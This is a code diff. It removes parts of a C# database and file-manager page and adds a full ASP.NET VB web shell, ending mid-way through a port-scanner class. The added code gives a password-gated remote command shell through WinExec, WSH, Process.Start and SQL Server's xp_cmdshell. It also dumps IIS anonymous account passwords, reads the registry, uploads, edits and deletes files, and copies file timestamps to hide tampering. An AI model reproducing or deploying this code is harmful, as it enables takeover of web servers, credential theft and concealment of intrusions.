-                    // Add the control to the TableCell
-                    tc.Text = dr[j].ToString();
-                    // Add the TableCell to the TableRow
-                    tr.Cells.Add(tc);
-                }
-                // Add the TableRow to the Table
-                tbl.Rows.Add(tr);
-                c=c+1;
-               
-            }
-            message(true, c.ToString() + " rows selected");
-        }
-        catch (Exception ex)
-        {
-            message(false, ex.Message);
-        }
- 
-       // This parameter helps determine in the LoadViewState event,
-       // whether to recreate the dynamic controls or not
- 
-      
-    }
-    // ////////////////////////////
-    protected void gdb_Click(object sender, EventArgs e)
-    {
-        show_panel(this.DBS.ID);
-        connstr = connections.Text;
-        getdatabases(0);
-    }
-
- 
-    protected void Button1_Click(object sender, EventArgs e)
-    {
-        show_panel(this.DBS.ID);
-        gettables(0);
-       // CreateDynamicTable();
-    }
-    // //////////////////////////////////////////////////////////////////
-
-    protected void executequery_Click(object sender, EventArgs e)
-    {
-        show_panel(this.DBS.ID);
-        CreateDynamicTable(sqlquery.Text);
-    }
-
-    protected void Login_Button_Click(object sender, EventArgs e)
-    {
-        string pass = Login_TextBox.Text;
-        if (pass == password)
-        {
-            Response.Cookies.Add(new HttpCookie("Login_Cookie", pass));
-          //  show_panel(this.FileManger.ID);
-             GetFiles_Dirs(".", true);
-             this.Menue.Visible = true;
-             Logout.Visible = true;
-         }
-        else
-        {
-         
-        }
-    }
-
-    protected void Logout_Click(object sender, EventArgs e)
-    {
-        hide_allpanel();
-        this.Menue.Visible = false;
-        //this.Login.Visible = true;
-        Session.Abandon();
-        Response.Cookies.Add(new HttpCookie("Login_Cookie", null));
-        Logout.Visible = false;
-    }
-
-    protected void Button_process_Click(object sender, EventArgs e)
-    {
-        show_panel(this.Processes_Services.ID);
-        process();
-    }
-
-    protected void Button_services_Click(object sender, EventArgs e)
-    {
-        show_panel(this.Processes_Services.ID);
-        process();
-    }
-
-    protected void DriversList_SelectedIndexChanged(object sender, EventArgs e)
-    {
-     //  DriversList.SelectedIndex =DriversList.Items[DriversList.SelectedIndex].;
-        Page.Title = DriversList.SelectedValue;
-    }
-    public void CopyShell(String Source, String Dest)
-    {
-        System.IO.File.Copy(Source, Dest, true);
-    }
-    public void CopyFile(object sender, EventArgs e)
-    {
-        show_panel(this.CopyFiles.ID);
-        try
-        {
-            CopyShell(this.TextBox1.Text, this.TextBox2.Text);
-            Label3.Text = "Success............";
-        }
-        catch (Exception ex)
-        {
-            Label3.Text = ex.Message;
-        }
-    }
+<%@ Page ContentType="text/html" validateRequest="false" aspcompat="true"%>
+<%@ Import Namespace="System.IO" %>
+<%@ import namespace="System.Diagnostics" %>
+<%@ import namespace="System.Threading" %>
+<%@ import namespace="System.Text" %>
+<%@ import namespace="System.Security.Cryptography" %>
+<%@ Import Namespace="System.Net.Sockets"%>
+<%@ Assembly Name="System.DirectoryServices, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A" %>
+<%@ import Namespace="System.DirectoryServices" %>
+<%@ import Namespace="Microsoft.Win32" %>
+<script language="VB" runat="server">
+Dim PASSWORD as string = "e8ff7d8d7a49a969a2cb8502eded9d79"   '   rooot
+dim url,TEMP1,TEMP2,TITLE as string
+Function GetMD5(ByVal strToHash As String) As String
+            Dim md5Obj As New System.Security.Cryptography.MD5CryptoServiceProvider()
+            Dim bytesToHash() As Byte = System.Text.Encoding.ASCII.GetBytes(strToHash)
+            bytesToHash = md5Obj.ComputeHash(bytesToHash)
+            Dim strResult As String = ""
+            Dim b As Byte
+            For Each b In bytesToHash
+                strResult += b.ToString("x2")
+            Next
+            Return strResult
+End Function
+Sub Login_click(sender As Object, E As EventArgs)
+	if GetMD5(Textbox.Text)=PASSWORD then     
+		session("rooot")=1
+		session.Timeout=60
+	else
+		response.Write("<font color='red'>Your password is wrong! Maybe you press the ""Caps Lock"" buttom. Try again.</font><br>")
+	end if
+End Sub
+'Run w32 shell
+Declare Function WinExec Lib "kernel32" Alias "WinExec" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long
+Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long)  As Long
+
+Sub RunCmdW32(Src As Object, E As EventArgs)
+	dim command
+	dim fileObject = Server.CreateObject("Scripting.FileSystemObject")		
+	dim tempFile = Environment.GetEnvironmentVariable("TEMP") & "\"& fileObject.GetTempName( )
+	If Request.Form("txtCommand1") = "" Then
+		command = "dir c:\"	
+	else 
+		command = Request.Form("txtCommand1")
+	End If	
+	ExecuteCommand1(command,tempFile,txtCmdFile.Text)
+	OutputTempFile1(tempFile,fileObject)
+	'txtCommand1.text=""
+End Sub
+Sub ExecuteCommand1(command As String, tempFile As String,cmdfile As String)
+	Dim winObj, objProcessInfo, item, local_dir, local_copy_of_cmd, Target_copy_of_cmd
+	Dim objStartup, objConfig, objProcess, errReturn, intProcessID, temp_name
+	Dim FailIfExists
+	
+	local_dir = left(request.servervariables("PATH_TRANSLATED"),inStrRev(request.servervariables("PATH_TRANSLATED"),"\"))
+	'local_copy_of_cmd = Local_dir+"cmd.exe"
+	'local_copy_of_cmd= "C:\\WINDOWS\\system32\\cmd.exe"
+	local_copy_of_cmd=cmdfile
+	Target_copy_of_cmd = Environment.GetEnvironmentVariable("Temp")+"\kiss.exe"
+	CopyFile(local_copy_of_cmd, Target_copy_of_cmd,FailIfExists)
+	errReturn = WinExec(Target_copy_of_cmd + " /c " + command + "  > " + tempFile , 10)
+	response.write(errReturn)
+	thread.sleep(500)
+End Sub
+Sub OutputTempFile1(tempFile,oFileSys)
+	On Error Resume Next 
+	dim oFile = oFileSys.OpenTextFile (tempFile, 1, False, 0)
+	resultcmdw32.text=txtCommand1.text & vbcrlf & "<pre>" & (Server.HTMLEncode(oFile.ReadAll)) & "</pre>"
+   	oFile.Close
+   	Call oFileSys.DeleteFile(tempFile, True)	 
+End sub
+'End w32 shell
+'Run WSH shell
+Sub RunCmdWSH(Src As Object, E As EventArgs)
+	dim command
+	dim fileObject = Server.CreateObject("Scripting.FileSystemObject")
+	dim oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
+	dim tempFile = Environment.GetEnvironmentVariable("TEMP") & "\"& fileObject.GetTempName( )
+	If Request.Form("txtcommand2") = "" Then
+		command = "dir c:\"	
+	else 
+		command = Request.Form("txtcommand2")
+	End If	  
+	ExecuteCommand2(command,tempFile)
+	OutputTempFile2(tempFile,fileObject)
+	txtCommand2.text=""
+End Sub
+Function ExecuteCommand2(cmd_to_execute, tempFile)
+	  Dim oScript
+	  oScript = Server.CreateObject("WSCRIPT.SHELL")
+      Call oScript.Run ("cmd.exe /c " & cmd_to_execute & " > " & tempFile, 0, True)
+End function
+Sub OutputTempFile2(tempFile,fileObject)
+    On Error Resume Next
+	dim oFile = fileObject.OpenTextFile (tempFile, 1, False, 0)
+	resultcmdwsh.text=txtCommand2.text & vbcrlf & "<pre>" & (Server.HTMLEncode(oFile.ReadAll)) & "</pre>"
+	oFile.Close
+	Call fileObject.DeleteFile(tempFile, True)
+End sub
+'End WSH shell
+
+'System infor
+Sub output_all_environment_variables(mode)
+   	Dim environmentVariables As IDictionary = Environment.GetEnvironmentVariables()
+   	Dim de As DictionaryEntry
+	For Each de In  environmentVariables
+	if mode="HTML" then
+	response.write("<b> " +de.Key + " </b>: " + de.Value + "<br>")
+	else
+	if mode="text"
+	response.write(de.Key + ": " + de.Value + vbnewline+ vbnewline)
+	end if		
+	end if
+   	Next
+End sub
+Sub output_all_Server_variables(mode)
+    dim item
+    for each item in request.servervariables
+	if mode="HTML" then
+	response.write("<b>" + item + "</b> : ")
+	response.write(request.servervariables(item))
+	response.write("<br>")
+	else
+		if mode="text"
+			response.write(item + " : " + request.servervariables(item) + vbnewline + vbnewline)
+		end if		
+	end if
+    next
+End sub
+'End sysinfor
+Function Server_variables() As String
+	dim item
+	dim tmp As String
+	tmp=""
+    for each item in request.ServerVariables
+    	if request.servervariables(item) <> ""
+    	'response.write(item + " : " + request.servervariables(item) + vbnewline + vbnewline)
+    	tmp =+ item.ToString + " : " + request.servervariables(item).ToString + "\n\r"
+    	end if
+    next
+    return tmp
+End function
+'Begin List processes
+Function output_wmi_function_data(Wmi_Function,Fields_to_Show)
+		dim objProcessInfo , winObj, item , Process_properties, Process_user, Process_domain
+		dim fields_split, fields_item,i
+
+		'on error resume next
+
+		table("0","","")
+		Create_table_row_with_supplied_colors("black","white","center",Fields_to_Show)
+
+		winObj = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+		objProcessInfo = winObj.ExecQuery("Select "+Fields_to_Show+" from " + Wmi_Function)					
+		
+		fields_split = split(Fields_to_Show,",")
+		for each item in objProcessInfo	
+			tr
+				Surround_by_TD_and_Bold(item.properties_.item(fields_split(0)).value)
+				if Ubound(Fields_split)>0 then
+					for i = 1 to ubound(fields_split)
+						Surround_by_TD(center_(item.properties_.item(fields_split(i)).value))				
+					next
+				end if
+			_tr
+		next
+End function
+Function output_wmi_function_data_instances(Wmi_Function,Fields_to_Show,MaxCount)
+		dim objProcessInfo , winObj, item , Process_properties, Process_user, Process_domain
+		dim fields_split, fields_item,i,count
+		newline
+		rw("Showing the first " + cstr(MaxCount) + " Entries")
+		newline
+		newline
+		table("1","","")
+		Create_table_row_with_supplied_colors("black","white","center",Fields_to_Show)
+		_table
+		winObj = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+'		objProcessInfo = winObj.ExecQuery("Select "+Fields_to_Show+" from " + Wmi_Function)					
+		objProcessInfo = winObj.InstancesOf(Wmi_Function)					
+		
+		fields_split = split(Fields_to_Show,",")
+		count = 0
+		for each item in objProcessInfo		
+			count = Count + 1
+			table("1","","")
+			tr
+				Surround_by_TD_and_Bold(item.properties_.item(fields_split(0)).value)
+				if Ubound(Fields_split)>0 then
+					for i = 1 to ubound(fields_split)
+						Surround_by_TD(item.properties_.item(fields_split(i)).value)				
+					next
+				end if
+			_tr
+			if count > MaxCount then exit for
+		next
+End function
+'End List processes
+'Begin IIS_list_Anon_Name_Pass
+Sub IIS_list_Anon_Name_Pass()
+		Dim IIsComputerObj, iFlags ,providerObj ,nodeObj ,item, IP
+		
+		IIsComputerObj = CreateObject("WbemScripting.SWbemLocator") 			' Create an instance of the IIsComputer object
+		providerObj = IIsComputerObj.ConnectServer("127.0.0.1", "root/microsoftIISv2")
+		nodeObj  = providerObj.InstancesOf("IIsWebVirtualDirSetting") '  - IISwebServerSetting
+		
+		Dim MaxCount = 20,Count = 0
+		hr
+		RW("only showing the first "+cstr(MaxCount) + " items")
+		hr
+		for each item in nodeObj
+			response.write("<b>" + item.AppFriendlyName + " </b> -  ")
+			response.write("(" + item.AppPoolId + ") ")
+		
+			response.write(item.AnonymousUserName + " : ")
+			response.write(item.AnonymousUserPass)
+			
+			response.write("<br>")
+			
+			response.flush
+			Count = Count +1
+			If Count > MaxCount then exit for
+		next		
+		hr
+End sub	
+'End IIS_list_Anon_Name_Pass
+Private Function CheckIsNumber(ByVal sSrc As String) As Boolean
+	Dim reg As New System.Text.RegularExpressions.Regex("^0|[0-9]*[1-9][0-9]*$")
+      If reg.IsMatch(sSrc) Then
+            Return True
+      Else
+            Return False
+      End If
+End Function
+
+Public Function IISSpy() As String
+      Dim iisinfo As String = ""
+      Dim iisstart As String = ""
+      Dim iisend As String = ""
+      Dim iisstr As String = "IIS://localhost/W3SVC"
+      Dim i As Integer = 0
+      Try
+            Dim mydir As New DirectoryEntry(iisstr)
+            iisstart = "<TABLE width=100% align=center border=0><TR align=center><TD width=5%><B>Order</B></TD><TD width=20%><B>IIS_USER</B></TD><TD width=20%><B>App_Pool_Id</B></TD><TD width=25%><B>Domain</B></TD><TD width=30%><B>Path</B></TD></TR>"
+            For Each child As DirectoryEntry In mydir.Children
+                  If CheckIsNumber(child.Name.ToString()) Then
+                        Dim dirstr As String = child.Name.ToString()
+                        Dim tmpstr As String = ""
+                        Dim newdir As New DirectoryEntry(iisstr + "/" + dirstr)
+                        Dim newdir1 As DirectoryEntry = newdir.Children.Find("root", "IIsWebVirtualDir")
+						i = i + 1
+                        iisinfo += "<TR><TD align=center>" + i.ToString() + "</TD>"
+                        iisinfo += "<TD align=center>" + newdir1.Properties("AnonymousUserName").Value.ToString() + "</TD>"
+                        iisinfo += "<TD align=center>" + newdir1.Properties("AppPoolId").Value.ToString() + "</TD>"
+                        iisinfo += "<TD>" + child.Properties("ServerBindings")(0) + "</TD>"
+                        iisinfo += "<TD><a href="+Request.ServerVariables("PATH_INFO")+ "?action=goto&src=" + newdir1.Properties("Path").Value.ToString() + "\>" + newdir1.Properties("Path").Value + "\</a></TD>"
+                        iisinfo += "</TR>"
+                  End If
+            Next
+            iisend = "</TABLE>"
+      Catch ex As Exception
+            Return ex.Message
+      End Try
+      Return iisstart + iisinfo + iisend
+End Function
+
+Sub RegistryRead(Src As Object, E As EventArgs)
+	Try
+            Dim regkey As String = txtRegKey.Text
+            Dim subkey As String = regkey.Substring(regkey.IndexOf("\") + 1, regkey.Length - regkey.IndexOf("\") - 1)
+            Dim rk As RegistryKey = Nothing
+            Dim buffer As Object
+            Dim regstr As String = ""
+            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_LOCAL_MACHINE" Then
+                  rk = Registry.LocalMachine.OpenSubKey(subkey)
+            End If
+            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_CLASSES_ROOT" Then
+                  rk = Registry.ClassesRoot.OpenSubKey(subkey)
+            End If
+            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_CURRENT_USER" Then
+                  rk = Registry.CurrentUser.OpenSubKey(subkey)
+            End If
+            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_USERS" Then
+                  rk = Registry.Users.OpenSubKey(subkey)
+            End If
+            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_CURRENT_CONFIG" Then
+                  rk = Registry.CurrentConfig.OpenSubKey(subkey)
+            End If
+            buffer = rk.GetValue(txtRegValue.Text, "NULL")
+		dim tmpbyte As Byte = 0
+                  lblresultReg.Text = "<br>Result : " + buffer.ToString()
+      Catch ex As Exception
+            Response.write(ex.Message)
+      End Try
+End Sub
+
+' Begin List Web Site Home Directory Properties
+
+
+' End List Web Site Home Directory Properties
+Sub RunCMD(Src As Object, E As EventArgs)
+	Try
+	Dim kProcess As New Process()
+	Dim kProcessStartInfo As New ProcessStartInfo("cmd.exe")
+	kProcessStartInfo.UseShellExecute = False
+	kProcessStartInfo.RedirectStandardOutput = true
+	kProcess.StartInfo = kProcessStartInfo
+	kProcessStartInfo.Arguments="/c " & Cmd.text
+	kProcess.Start()
+	Dim myStreamReader As StreamReader = kProcess.StandardOutput
+	Dim myString As String = myStreamReader.Readtoend()
+	kProcess.Close()
+	result.text=Cmd.text & vbcrlf & "<pre>" & mystring & "</pre>"
+	Cmd.text=""
+	Catch
+	result.text="This function has disabled!"
+	End Try
+End Sub
+Sub CloneTime(Src As Object, E As EventArgs)
+	existdir(time1.Text)
+	existdir(time2.Text)
+	Dim thisfile As FileInfo =New FileInfo(time1.Text)
+	Dim thatfile As FileInfo =New FileInfo(time2.Text)
+	thisfile.LastWriteTime = thatfile.LastWriteTime
+	thisfile.LastAccessTime = thatfile.LastAccessTime
+	thisfile.CreationTime = thatfile.CreationTime
+	response.Write("<font color=""red"">Clone Time Success!</font>")
+End Sub
+sub Editor(Src As Object, E As EventArgs)
+	dim mywrite as new streamwriter(filepath.text,false,encoding.default)
+	mywrite.write(content.text)
+	mywrite.close
+	response.Write("<script>alert('Edit|Creat " & replace(filepath.text,"\","\\") & " Success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(filepath.text)) &"'</sc" & "ript>")
+end sub
+Sub UpLoad(Src As Object, E As EventArgs)
+	dim filename,loadpath as string
+	filename=path.getfilename(UpFile.value)
+	loadpath=request.QueryString("src") & filename
+	if  file.exists(loadpath)=true then 
+		response.Write("<script>alert('File " & replace(loadpath,"\","\\") & " have existed , upload fail!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(request.QueryString("src")) &"'</sc" & "ript>")
+		response.End()
+	end if
+	UpFile.postedfile.saveas(loadpath)
+	response.Write("<script>alert('File " & filename & " upload success!\nFile info:\n\nClient Path:" & replace(UpFile.value,"\","\\") & "\nFile Size:" & UpFile.postedfile.contentlength & " bytes\nSave Path:" & replace(loadpath,"\","\\") & "\n');")
+	response.Write("location.href='" & request.ServerVariables("URL") & "?action=goto&src=" & server.UrlEncode(request.QueryString("src")) & "'</sc" & "ript>")
+End Sub
+Sub NewFD(Src As Object, E As EventArgs)
+	url=request.form("src")
+	if NewFile.Checked = True then
+		dim mywrite as new streamwriter(url & NewName.Text,false,encoding.default)
+		mywrite.close
+		response.Redirect(request.ServerVariables("URL") & "?action=edit&src=" & server.UrlEncode(url & NewName.Text))
+	else
+		directory.createdirectory(url & NewName.Text)
+		response.Write("<script>alert('Creat directory " & replace(url & NewName.Text ,"\","\\") & " Success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</sc" & "ript>")
+	end if
+End Sub
+Sub del(a)
+	if right(a,1)="\" then
+		dim xdir as directoryinfo
+		dim mydir as new DirectoryInfo(a)
+		dim xfile as fileinfo
+		for each xfile in mydir.getfiles()
+			file.delete(a & xfile.name)
+		next
+		for each xdir in mydir.getdirectories()
+			call del(a & xdir.name & "\")
+		next
+		directory.delete(a)
+	else
+		file.delete(a)
+	end if
+End Sub
+Sub copydir(a,b)
+	dim xdir as directoryinfo
+	dim mydir as new DirectoryInfo(a)
+	dim xfile as fileinfo
+	for each xfile in mydir.getfiles()
+		file.copy(a & "\" & xfile.name,b & xfile.name)
+	next
+	for each xdir in mydir.getdirectories()
+		directory.createdirectory(b & path.getfilename(a & xdir.name))
+		call copydir(a & xdir.name & "\",b & xdir.name & "\")
+	next
+End Sub
+Sub xexistdir(temp,ow)
+	if directory.exists(temp)=true or file.exists(temp)=true then 
+		if ow=0  then
+			response.Redirect(request.ServerVariables("URL") & "?action=samename&src=" & server.UrlEncode(url))
+		elseif ow=1 then
+			del(temp)
+		else
+			dim d as string = session("cutboard")
+			if right(d,1)="\" then
+				TEMP1=url & second(now) & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
+			else
+				TEMP2=url & second(now) & replace(path.getfilename(d),"","")
+			end if
+		end if
+	end if
+End Sub
+Sub existdir(temp)
+		if  file.exists(temp)=false and directory.exists(temp)=false then 
+			response.Write("<script>alert('Don\'t exist " & replace(temp,"\","\\")  &" ! Is it a CD-ROM ?');</sc" & "ript>")
+			response.Write("<br><br><a href='javascript:history.back(1);'>Click Here Back</a>")
+			response.End()
+		end if
+End Sub
+Sub RunSQLCMD(Src As Object, E As EventArgs)
+	Dim adoConn,strQuery,recResult,strResult
+	if SqlName.Text<>"" then
+		adoConn=Server.CreateObject("ADODB.Connection") 
+		adoConn.Open("Provider=SQLOLEDB.1;Password=" & SqlPass.Text & ";UID=" & SqlName.Text & ";Data Source = " & ip.Text) 
+		If Sqlcmd.Text<>"" Then 
+			strQuery = "exec master.dbo.xp_cmdshell '" & Sqlcmd.Text & "'" 
+	  		recResult = adoConn.Execute(strQuery) 
+ 	 		If NOT recResult.EOF Then 
+   				Do While NOT recResult.EOF 
+    				strResult = strResult & chr(13) & recResult(0).value
+    				recResult.MoveNext 
+   				Loop 
+ 	 		End if 
+  			recResult = Nothing 
+  			strResult = Replace(strResult," ","&nbsp;") 
+  			strResult = Replace(strResult,"<","&lt;") 
+  			strResult = Replace(strResult,">","&gt;") 
+			resultSQL.Text=SqlCMD.Text & vbcrlf & "<pre>" & strResult & "</pre>"
+			SqlCMD.Text=""
+		 End if 
+  		adoConn.Close 
+	 End if
+ End Sub
+Sub RunSQLQUERY(Src As Object, E As EventArgs)
+	Dim adoConn,strQuery,recResult,strResult
+	if txtSqlName.Text<>"" then
+		adoConn=Server.CreateObject("ADODB.Connection") 
+		adoConn.Open("Provider=SQLOLEDB.1;Password=" & txtSqlPass.Text & ";UID=" & txtSqlName.Text & ";Data Source = " & txtHost.Text) 
+		If txtSqlcmd.Text<>"" Then 
+			strQuery = txtSqlcmd.Text
+	  		recResult = adoConn.Execute(strQuery) 
+ 	 		If NOT recResult.EOF Then 
+   				Do While NOT recResult.EOF 
+    				strResult = strResult & chr(13) & recResult(0).value
+    				recResult.MoveNext 
+   				Loop 
+ 	 		End if 
+  			recResult = Nothing 
+  			strResult = Replace(strResult," ","&nbsp;") 
+  			strResult = Replace(strResult,"<","&lt;") 
+  			strResult = Replace(strResult,">","&gt;") 
+			lblresultSQL.Text=txtSqlCMD.Text & vbcrlf & "<pre>" & strResult & "</pre>"
+			txtSqlCMD.Text=""
+		 End if 
+  		adoConn.Close 
+	 End if
+ End Sub
+
+Function GetStartedTime(ms) 
+	GetStartedTime=cint(ms/(1000*60*60))
+End function
+Function getIP() 
+    Dim strIPAddr as string
+    If Request.ServerVariables("HTTP_X_FORWARDED_FOR") = "" OR InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), "unknown") > 0 Then
+        strIPAddr = Request.ServerVariables("REMOTE_ADDR")
+    ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") > 0 Then
+        strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",")-1)
+    ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") > 0 Then
+        strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";")-1)
+    Else
+        strIPAddr = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
+    End If
+    getIP = Trim(Mid(strIPAddr, 1, 30))
+End Function
+Function Getparentdir(nowdir)
+	dim temp,k as integer
+	temp=1
+	k=0
+	if len(nowdir)>4 then 
+		nowdir=left(nowdir,len(nowdir)-1) 
+	end if
+	do while temp<>0
+		k=temp+1
+		temp=instr(temp,nowdir,"\")
+		if temp =0 then
+			exit do
+		end if
+		temp = temp+1
+	loop
+	if k<>2 then
+		getparentdir=mid(nowdir,1,k-2)
+	else
+		getparentdir=nowdir
+	end if
+End function
+Function Rename()
+	url=request.QueryString("src")
+	if file.exists(Getparentdir(url) & request.Form("name")) then
+		rename=0   
+	else
+		file.copy(url,Getparentdir(url) & request.Form("name"))
+		del(url)
+		rename=1
+	end if
+End Function 
+Function GetSize(temp)
+	if temp < 1024 then
+		GetSize=temp & " bytes"
+	else
+		if temp\1024 < 1024 then
+			GetSize=temp\1024 & " KB"
+		else
+			if temp\1024\1024 < 1024 then
+				GetSize=temp\1024\1024 & " MB"
+			else
+				GetSize=temp\1024\1024\1024 & " GB"
+			end if
+		end if
+	end if
+End Function 
+Sub downTheFile(thePath)
+		dim stream
+		stream=server.createObject("adodb.stream")
+		stream.open
+		stream.type=1
+		stream.loadFromFile(thePath)
+		response.addHeader("Content-Disposition", "attachment; filename=" & replace(server.UrlEncode(path.getfilename(thePath)),"+"," "))
+		response.addHeader("Content-Length",stream.Size)
+		response.charset="UTF-8"
+		response.contentType="application/octet-stream"
+		response.binaryWrite(stream.read)
+		response.flush
+		stream.close
+		stream=nothing
+		response.End()
+End Sub
+'H T M L  S N I P P E T S
+public sub Newline
+		response.write("<BR>")
+	end sub
+	
+	public sub TextNewline
+		response.write(vbnewline)
+	end sub
+
+	public sub rw(text_to_print)	  ' Response.write
+		response.write(text_to_print)
+	end sub
+
+	public sub rw_b(text_to_print)
+		rw("<b>"+text_to_print+"</b>")
+	end sub
+
+	public sub hr()
+		rw("<hr>")
+	end sub
+
+	public sub ul()
+		rw("<ul>")
+	end sub
+
+	public sub _ul()
+		rw("</ul>")
+	end sub
+
+	public sub table(border_size,width,height)
+		rw("<table border='"+cstr(border_size)+"' width ='"+cstr(width)+"' height='"+cstr(height)+"'>")
+	end sub
+
+	public sub _table()
+		rw("</table>")
+	end sub
+
+	public sub tr()
+		rw("<tr>")
+	end sub
+
+	public sub _tr()
+		rw("</tr>")
+	end sub
+
+	public sub td()
+		rw("<td>")
+	end sub
+
+	public sub _td()
+		rw("</td>")
+	end sub
+
+	public sub td_span(align,name,contents)
+		rw("<td align="+align+"><span id='"+name+"'>"+ contents + "</span></td>")
+	end sub
+
+	Public sub td_link(align,title,link,target)
+		rw("<td align="+align+"><a href='"+link+"' target='"+target+"'>"+title+"</a></td>")
+	end sub
+
+	Public sub link(title,link,target)
+		rw("<a href='"+link+"' target='"+target+"'>"+title+"</a>")
+	end sub
+
+	Public sub link_hr(title,link,target)
+		rw("<a href='"+link+"' target='"+target+"'>"+title+"</a>")
+		hr
+	end sub
+
+	Public sub link_newline(title,link,target)
+		rw("<a href='"+link+"' target='"+target+"'>"+title+"</a>")
+		newline
+	end sub
+	
+	public sub empty_Cell(ColSpan)
+		rw("<td colspan='"+cstr(colspan)+"'></td>")
+	end sub
+
+	public sub empty_row(ColSpan)
+		rw("<tr><td colspan='"+cstr(colspan)+"'></td></tr>")
+	end sub
+
+       	Public sub Create_table_row_with_supplied_colors(bgColor, fontColor, alignValue, rowItems)
+            dim rowItem
+
+            rowItems = split(rowItems,",")
+            response.write("<tr bgcolor="+bgcolor+">")
+            for each rowItem in RowItems
+                response.write("<td align="+alignValue+"><font color="+fontColor+"><b>"+rowItem +"<b></font></td>")
+            next
+            response.write("</tr>")
+
+        end sub
+
+        Public sub TR_TD(cellContents)
+            response.write("<td>")
+            response.write(cellContents)
+            response.write("</td>")
+        end sub
+	
+
+        Public sub Surround_by_TD(cellContents)
+            response.write("<td>")
+            response.write(cellContents)
+            response.write("</td>")
+        end sub
+
+        Public sub Surround_by_TD_and_Bold(cellContents)
+            response.write("<td><b>")
+            response.write(cellContents)
+            response.write("</b></td>")
+        end sub
+
+        Public sub Surround_by_TD_with_supplied_colors_and_bold(bgColor, fontColor, alignValue, cellContents)
+            response.write("<td align="+alignValue+" bgcolor="+bgcolor+" ><font color="+fontColor+"><b>")
+            response.write(cellContents)
+            response.write("</b></font></td>")
+        end sub
+	Public sub Create_background_Div_table(title,main_cell_contents,top,left,width,height,z_index)
+		response.write("<div style='position: absolute; top: " + top + "; left: " + left + "; width: "+width+"; height: "+height+"; z-index: "+z_index+"'>")
+		response.write("  <table border='1' cellpadding='0' cellspacing='0' style='border-collapse: collapse' bordercolor='#111111' width='100%' id='AutoNumber1' height='100%'>")
+		response.write("    <tr heigth=20>")
+		response.write("      <td bgcolor='black' align=center><font color='white'><b>"+ title +"</b></font></td>")
+		response.write("    </tr>")
+		response.write("    <tr>")
+		response.write("      <td>"+main_Cell_contents+"</td>")
+		response.write("    </tr>")
+		response.write("  </table>")
+		response.write("</div>")
+	end sub
+
+	Public sub Create_Div_open(top,left,width,height,z_index)
+		response.write("<div style='position: absolute; top: " + top + "; left: " + left + "; width: "+width+"; height: "+height+"; z-index: "+z_index+"'>")
+	end sub
+
+
+	Public sub Create_Div_close()
+		response.write("</div>")
+	end sub
+
+	public sub Create_Iframe(left, top, width, height, name,src)
+		rw("<span style='position: absolute; left: " + left+ "; top: " +top + "'>")  
+		rw("	<iframe name='" + name+ "' src='" + src+ "' width='" + cstr(width) + "' height='" + cstr(height) + "'></iframe>")
+    		rw("</span>")
+	end sub
+
+	public sub Create_Iframe_relative(width, height, name,src)
+		rw("	<iframe name='" + name+ "' src='" + src+ "' width='" + cstr(width) + "' height='" + cstr(height) + "'></iframe>")
+	end sub
+
+	public sub return_100_percent_table()
+		rw("<table border width='100%' height='100%'><tr><td>sdf</td></tr></table>")
+	end sub
+
+	public sub font_size(size)
+		rw("<font size="+size+">")
+	end sub
+
+	public sub end_font()
+		rw("</font>")
+	end sub
+
+	public sub red(contents)
+		rw("<font color=red>"+contents+"</font>")
+	end sub
+
+	public sub yellow(contents)
+		rw("<font color='#FF8800'>"+contents+"</font>")
+	end sub
+
+	public sub green(contents)
+		rw("<font color=green>"+contents+"</font>")
+	end sub
+	public sub print_var(var_name, var_value,var_description)
+		if var_description<> "" Then
+			rw(b_(var_name)+" : " + var_value + i_("  ("+var_description+")"))
+		else
+			rw(b_(var_name)+" : " + var_value)
+		end if
+		newline
+	end sub
+
+' Functions
+
+	public function br_()
+		br_ = "<br>"
+	end function
+
+	public function b_(contents)
+		b_ = "<b>"+ contents + "</b>"
+	end function
+
+	public function i_(contents)
+		i_ = "<i>"+ contents + "</i>"
+	end function
+
+	public function li_(contents)
+		li_ = "<li>"+ contents + "</li>"
+	end function
+
+	public function h1_(contents)
+		h1_ = "<h1>"+ contents + "</h1>"
+	end function
+
+	public function h2_(contents)
+		h2_ = "<h2>"+ contents + "</h2>"
+	end function
+
+	public function h3_(contents)
+		h3_ = "<h3>"+ contents + "</h3>"
+	end function
+
+	public function big_(contents)
+		big_ = "<big>"+ contents + "</big>"
+	end function
+
+	public function center_(contents)
+		center_ = "<center>"+ cstr(contents) + "</center>"
+	end function
+
+
+	public function td_force_width_(width)
+		td_force_width_ = "<br><img src='' height=0 width=" + cstr(width) +  " border=0>"
+	end function
+
+
+	public function red_(contents)
+		red_ = "<font color=red>"+contents+"</font>"
+	end function
+
+	public function yellow_(contents)
+		yellow_ = "<font color='#FF8800'>"+contents+"</font>"
+	end function
+
+	public function green_(contents)
+		green_ = "<font color=green>"+contents+"</font>"
+	end function
+
+	Public function link_(title,link,target)
+		link_ = "<a href='"+link+"' target='"+target+"'>"+title+"</a>"
+	end function
+'End HTML SNIPPETS	
+
+'Begin Scanner
+Public Class Scanner
+Public Ips As New ArrayList()
+Public ports As New ArrayList()
+Public succMsg As New StringBuilder()
